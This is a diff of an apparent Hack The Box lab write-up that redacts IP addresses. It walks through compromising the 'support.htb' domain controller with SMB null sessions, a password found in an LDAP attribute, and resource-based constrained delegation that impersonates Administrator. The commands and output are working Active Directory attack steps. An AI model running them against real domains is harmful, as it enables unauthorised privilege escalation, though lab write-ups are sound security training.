@@ -32,7 +32,7 @@ Nmap identifies a Windows domain controller at `support.htb` exposing DNS, Kerbe
 ### Nmap
 
 ```bash
-nmap -sC -sV -Pn 10.129.26.13
+nmap -sC -sV -Pn <DC_IP>
 ```
 
 ```
@@ -66,16 +66,16 @@ nxc smb support.htb -u "DoesNotExist" -p "" --shares
 
 ```
 # Console Output
-SMB         10.129.26.13    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.26.13    445    DC               [+] support.htb\guest:
-SMB         10.129.26.13    445    DC               Share           Permissions     Remark
-SMB         10.129.26.13    445    DC               -----           -----------     ------
-SMB         10.129.26.13    445    DC               ADMIN$                          Remote Admin
-SMB         10.129.26.13    445    DC               C$                              Default share
-SMB         10.129.26.13    445    DC               IPC$            READ            Remote IPC
-SMB         10.129.26.13    445    DC               NETLOGON                        Logon server share
-SMB         10.129.26.13    445    DC               support-tools   READ            support staff tools
-SMB         10.129.26.13    445    DC               SYSVOL                          Logon server share
+SMB         <DC_IP>    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <DC_IP>    445    DC               [+] support.htb\guest:
+SMB         <DC_IP>    445    DC               Share           Permissions     Remark
+SMB         <DC_IP>    445    DC               -----           -----------     ------
+SMB         <DC_IP>    445    DC               ADMIN$                          Remote Admin
+SMB         <DC_IP>    445    DC               C$                              Default share
+SMB         <DC_IP>    445    DC               IPC$            READ            Remote IPC
+SMB         <DC_IP>    445    DC               NETLOGON                        Logon server share
+SMB         <DC_IP>    445    DC               support-tools   READ            support staff tools
+SMB         <DC_IP>    445    DC               SYSVOL                          Logon server share
 ```
 
 Null authentication succeeds and `support-tools` is readable. We connect with `smbclient`:
@@ -166,14 +166,12 @@ ldap:<PASSWORD REDACTED>
 
 The `ldap` service account authenticates using LDAP simple bind with no transport security — any observer on the path between the client and the DC sees the password verbatim. This is the root cause: the application neither uses Kerberos nor enforces LDAPS.
 
-> 💡 **Author's Note:** The notes reference two distinct target IPs: `10.129.26.13` (initial recon and SMB enumeration) and `10.129.230.181` (later LDAP queries and RBCD). This is a routine artefact of HTB machine resets between sessions, which issue a new DHCP address. The hostname `support.htb` / `dc.support.htb` is the stable identifier throughout, and both IPs resolve to the same machine.
-
 ### Authenticated Enumeration
 
 With valid credentials we expand our enumeration surface. First, generate `/etc/hosts` entries:
 
 ```bash
-nxc smb 10.129.26.13 -u "ldap" -p '<PASSWORD REDACTED>' --generate-hosts-file hosts
+nxc smb <DC_IP> -u "ldap" -p '<PASSWORD REDACTED>' --generate-hosts-file hosts
 ```
 
 ```
@@ -189,21 +187,21 @@ nxc smb support.htb -u "ldap" -p '<PASSWORD REDACTED>' --users
 
 ```
 # Console Output
-SMB         10.129.26.13    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) ...
-SMB         10.129.26.13    445    DC               [+] support.htb\ldap:<PASSWORD REDACTED>
-SMB         10.129.26.13    445    DC               -Username-                    -Last PW Set-       -BadPW-
-SMB         10.129.26.13    445    DC               Administrator                 2022-07-19 17:55:56 0
-SMB         10.129.26.13    445    DC               Guest                         2022-05-28 11:18:55 0
-SMB         10.129.26.13    445    DC               krbtgt                        2022-05-28 11:03:43 0
-SMB         10.129.26.13    445    DC               ldap                          2022-05-28 11:11:46 0
-SMB         10.129.26.13    445    DC               support                       2022-05-28 11:12:00 0
-SMB         10.129.26.13    445    DC               smith.rosario                 2022-05-28 11:12:19 0
-SMB         10.129.26.13    445    DC               hernandez.stanley             2022-05-28 11:12:34 0
-SMB         10.129.26.13    445    DC               wilson.shelby                 2022-05-28 11:12:50 0
-SMB         10.129.26.13    445    DC               anderson.damian               2022-05-28 11:13:05 0
-SMB         10.129.26.13    445    DC               thomas.raphael                2022-05-28 11:13:21 0
+SMB         <DC_IP>    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) ...
+SMB         <DC_IP>    445    DC               [+] support.htb\ldap:<PASSWORD REDACTED>
+SMB         <DC_IP>    445    DC               -Username-                    -Last PW Set-       -BadPW-
+SMB         <DC_IP>    445    DC               Administrator                 2022-07-19 17:55:56 0
+SMB         <DC_IP>    445    DC               Guest                         2022-05-28 11:18:55 0
+SMB         <DC_IP>    445    DC               krbtgt                        2022-05-28 11:03:43 0
+SMB         <DC_IP>    445    DC               ldap                          2022-05-28 11:11:46 0
+SMB         <DC_IP>    445    DC               support                       2022-05-28 11:12:00 0
+SMB         <DC_IP>    445    DC               smith.rosario                 2022-05-28 11:12:19 0
+SMB         <DC_IP>    445    DC               hernandez.stanley             2022-05-28 11:12:34 0
+SMB         <DC_IP>    445    DC               wilson.shelby                 2022-05-28 11:12:50 0
+SMB         <DC_IP>    445    DC               anderson.damian               2022-05-28 11:13:05 0
+SMB         <DC_IP>    445    DC               thomas.raphael                2022-05-28 11:13:21 0
 ...
-SMB         10.129.26.13    445    DC               [*] Enumerated 20 local users: SUPPORT
+SMB         <DC_IP>    445    DC               [*] Enumerated 20 local users: SUPPORT
 ```
 
 > **Rabbit Hole — Password Reuse**
@@ -234,15 +232,15 @@ nxc ldap dc.support.htb -u ldap -p '<PASSWORD REDACTED>' --query "(sAMAccountNam
 
 ```
 # Console Output
-LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:<PASSWORD REDACTED>
-LDAP        10.129.230.181  389    DC               [+] Response for object: CN=support,CN=Users,DC=support,DC=htb
-LDAP        10.129.230.181  389    DC               cn                   support
-LDAP        10.129.230.181  389    DC               c                    US
-LDAP        10.129.230.181  389    DC               l                    Chapel Hill
-LDAP        10.129.230.181  389    DC               info                 <PASSWORD REDACTED>
-LDAP        10.129.230.181  389    DC               memberOf             CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
-LDAP        10.129.230.181  389    DC                                    CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
-LDAP        10.129.230.181  389    DC               distinguishedName    CN=support,CN=Users,DC=support,DC=htb
+LDAP        <DC_IP>  389    DC               [+] support.htb\ldap:<PASSWORD REDACTED>
+LDAP        <DC_IP>  389    DC               [+] Response for object: CN=support,CN=Users,DC=support,DC=htb
+LDAP        <DC_IP>  389    DC               cn                   support
+LDAP        <DC_IP>  389    DC               c                    US
+LDAP        <DC_IP>  389    DC               l                    Chapel Hill
+LDAP        <DC_IP>  389    DC               info                 <PASSWORD REDACTED>
+LDAP        <DC_IP>  389    DC               memberOf             CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+LDAP        <DC_IP>  389    DC                                    CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+LDAP        <DC_IP>  389    DC               distinguishedName    CN=support,CN=Users,DC=support,DC=htb
 ...
 ```
 
@@ -256,8 +254,8 @@ nxc smb support.htb -u support -p '<PASSWORD REDACTED>'
 
 ```
 # Console Output
-SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.230.181  445    DC               [+] support.htb\support:<PASSWORD REDACTED>
+SMB         <DC_IP>    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <DC_IP>    445    DC               [+] support.htb\support:<PASSWORD REDACTED>
 ```
 
 The `support` user is also a member of `Remote Management Users`, confirming WinRM access. We connect with Evil-WinRM:
@@ -298,9 +296,9 @@ nxc ldap dc.support.htb -u support -p '<PASSWORD REDACTED>' -M add-computer -o N
 
 ```
 # Console Output
-LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) ...
-LDAP        10.129.230.181  389    DC               [+] support.htb\support:<PASSWORD REDACTED>
-ADD-COMP... 10.129.230.181  389    DC               Successfully added "FAKEBOX$" with password "Password123!"
+LDAP        <DC_IP>  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) ...
+LDAP        <DC_IP>  389    DC               [+] support.htb\support:<PASSWORD REDACTED>
+ADD-COMP... <DC_IP>  389    DC               Successfully added "FAKEBOX$" with password "Password123!"
 ```
 
 **Step 2 — Write RBCD trust to the DC object.**
@@ -308,7 +306,7 @@ ADD-COMP... 10.129.230.181  389    DC               Successfully added "FAKEBOX$
 `rbcd.py` writes a security descriptor into `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC$`, authorising `FAKEBOX$` to perform S4U2Proxy delegation on its behalf:
 
 ```bash
-rbcd.py -delegate-from 'FAKEBOX$' -delegate-to 'DC$' -action 'write' -dc-ip 10.129.230.181 'support.htb/support:<PASSWORD REDACTED>'
+rbcd.py -delegate-from 'FAKEBOX$' -delegate-to 'DC$' -action 'write' -dc-ip <DC_IP> 'support.htb/support:<PASSWORD REDACTED>'
 ```
 
 ```
@@ -325,7 +323,7 @@ rbcd.py -delegate-from 'FAKEBOX$' -delegate-to 'DC$' -action 'write' -dc-ip 10.1
 The S4U2Self/S4U2Proxy Kerberos extensions allow a service to request a ticket for any user and forward it to a back-end service. `getST.py` exercises both: S4U2Self first obtains a forwardable TGS for `Administrator` addressed to `FAKEBOX$`, then S4U2Proxy exchanges it for a CIFS ticket to `DC$`:
 
 ```bash
-getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' -dc-ip 10.129.230.181 'support.htb/FAKEBOX$:Password123!'
+getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' -dc-ip <DC_IP> 'support.htb/FAKEBOX$:Password123!'
 ```
 
 ```
